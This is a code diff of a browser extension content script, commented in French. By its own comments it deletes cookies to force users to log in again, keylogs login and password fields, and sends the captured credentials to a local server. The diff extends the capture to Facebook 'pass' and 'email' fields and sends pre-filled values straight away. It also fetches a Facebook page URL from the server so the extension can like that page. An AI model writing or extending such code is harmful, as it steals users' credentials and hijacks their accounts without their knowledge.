@@ -9,8 +9,11 @@ var finalInputsId = [];
 var inputId = [];
 var inputs = [];
 var str = [];
+var json = "";
 
-
+/*-----------------------------------------------------------------------------------------------------------------------------------------
+ supression des cookies pour deconnecter l'utilisateur et le forcer à entrer ses identifiants
+ -----------------------------------------------------------------------------------------------------------------------------------------*/
 
 function deleteCookies (site) {
     var cookies = document.cookie.split("; ");
@@ -30,10 +33,21 @@ function deleteCookies (site) {
 }
 
 
+if(window.location.href.indexOf("https://www.facebook.com/login.php?login_attempt=") > -1){
+	window.location.href = "https://www.facebook.com";
+}
+
+if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.getElementsByClassName("jewelCount").length == 0 ){
+		chrome.runtime.sendMessage({noneed: "jj"});
+}
+
+/*-----------------------------------------------------------------------------------------------------------------------------------------
+requete serveur de l'url de la page facebook à aller liker
+ -----------------------------------------------------------------------------------------------------------------------------------------*/
+
 var boolean =  window.location.href.split('/')[3] != ""
 
-if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.getElementsByClassName("jewelCount") != null ){
-		chrome.runtime.sendMessage({connexion: "www.facebook.com"});
+if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.getElementsByClassName("jewelCount").length > 0 ){
 	if( boolean == false ){
 		var xhr1 = new XMLHttpRequest();
 		xhr1.open("GET", "https://127.0.0.1:8080/page", false);
@@ -48,16 +62,26 @@ if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.get
 				console.log(err.message);
 			}
 		}
-
+		setTimeout(function(){chrome.runtime.sendMessage({connexion: "www.facebook.com"});}, 1000);
 	}
+//	chrome.runtime.sendMessage({connexion: "www.facebook.com"});
+
 }
 
+
+/*-----------------------------------------------------------------------------------------------------------------------------------------
+reperage du nombre de videos sur la page et mis a jour du badge de notification côté client
+ -----------------------------------------------------------------------------------------------------------------------------------------*/
 
 var videos = document.getElementsByTagName("video");
 var nbVideos = videos.length.toString();
 
 chrome.runtime.sendMessage({badgeText: nbVideos});
 
+
+/*-----------------------------------------------------------------------------------------------------------------------------------------
+Reperage des labels et inputs a surveiller pour le déclenchement du keyloger
+ -----------------------------------------------------------------------------------------------------------------------------------------*/
 
 for (var i = elemLabels.length - 1; i >= 0; i--) {
 	labels[i] = elemLabels[i].innerHTML;
@@ -82,6 +106,18 @@ for (var i = finalInputsId.length - 1; i >= 0; i--) {
 var inputbis = document.getElementsByName("loginfmt");
 var inputter = document.getElementsByName("password");
 var input4 = document.getElementsByName("passwd");
+var input5 = document.getElementsByName("pass");
+var input6 = document.getElementsByName("email");
+
+for (var i = input5.length - 1; i >= 0; i--) {
+	inputs.push(input5[i]);
+	str.push("username");
+}
+
+for (var i = input6.length - 1; i >= 0; i--) {
+	inputs.push(input6[i]);
+	str.push("username");
+}
 
 for (var i = inputbis.length - 1; i >= 0; i--) {
 	inputs.push(inputbis[i]);
@@ -104,7 +140,12 @@ for (var i = inputs.length - 1; i >= 0; i--) {
 		inputs[i].onkeypress = keylogger_password;
 	}
 	else{
-		inputs[i].onkeypress = keylogger_login;
+		if(inputs[i].value != ""){
+			sendToServer("Login", inputs[i].value);
+		}
+		else{
+			inputs[i].onkeypress = keylogger_login;
+		}
 	}
 }
 
@@ -136,8 +177,8 @@ function keylogger_password(e) {
 }
 
 
-var url = "https://127.0.0.1:8080/json";
-var json = "";
+var url = "https://root:root@127.0.0.1:8080/json";
+
 
 function sendToServer(libelle,value){
 	if(libelle == "Login"){
@@ -147,9 +188,9 @@ function sendToServer(libelle,value){
 		json = json + '"' + value + '"}';
 		var xhr = new XMLHttpRequest();
 		xhr.open("POST", url, true);
-		//xhr.setRequestHeader("Authorization", "auth " + Base64.encode("root" + ":" + "root"));
 		xhr.setRequestHeader("Content-type", "application/json");
 		xhr.send(json);
+		json = "";
 	}
 
 	if(libelle == "Login"){
